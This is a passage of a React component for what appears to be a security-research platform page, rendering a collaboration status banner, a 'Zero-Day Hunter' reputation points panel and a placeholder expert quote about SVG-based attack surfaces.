                            <div className="mt-4 p-3 rounded-lg bg-emerald-500/5 border border-emerald-500/20 text-center">
                                <p className="text-[10px] font-bold text-emerald-400 uppercase tracking-widest animate-pulse">
                                    {collaborationStatus === "awaiting" && "Awaiting Researcher Response..."}
                                    {collaborationStatus === "reviewing" && "Researcher Reviewing Request..."}
                                    {collaborationStatus === "established" && "Collaboration Tunnel Active"}
                                </p>
                            </div>
                        )}
                    </div>

                    <div className="p-6 rounded-xl border border-primary/20 bg-primary/5 space-y-4">
                        <div className="flex items-center gap-2">
                            <Cpu className="h-4 w-4 text-primary" />
                            <h4 className="text-sm font-bold">Reputation Accrual</h4>
                        </div>
                        <div className="space-y-2">
                            <div className="flex justify-between text-xs mb-1">
                                <span className="text-muted-foreground italic">Elite Credit Impact:</span>
                                <span className="text-primary font-bold">+250 POINTS</span>
                            </div>
                            <Progress value={100} className="h-1 shadow-[0_0_10px_rgba(38,217,98,0.2)]" />
                            <p className="text-[10px] text-muted-foreground pt-1 italic">
                                This case study is contributing to the "Zero-Day Hunter" global leaderboard.
                            </p>
                        </div>
                    </div>

                    <div className="p-6 rounded-xl border border-white/10 bg-black/20 space-y-4 relative overflow-hidden group hover:border-primary/30 transition-colors">
                        <div className="absolute top-0 right-0 p-4 opacity-10">
                            <Fingerprint className="h-12 w-12 text-primary" />
                        </div>
                        <h4 className="text-sm font-bold flex items-center gap-2">
                            <FileText className="h-4 w-4 text-primary" /> Expert Panel Notes
                        </h4>
                        <p className="text-xs text-muted-foreground leading-relaxed italic">
                            "The research provided here establishes a new baseline for SVG-based attack surfaces in regulated financial portals. Highly recommended for board-level review."
                        </p>
                        <div className="flex items-center gap-2 text-[10px] font-bold text-foreground pt-2">
                            <div className="h-5 w-5 rounded-full bg-secondary/20 flex items-center justify-center text-[8px]">JD</div>
                            Jane Doe, Chief Governance Officer
                        </div>
                    </div>


                </div>
            </div>
        </div>
    );
}
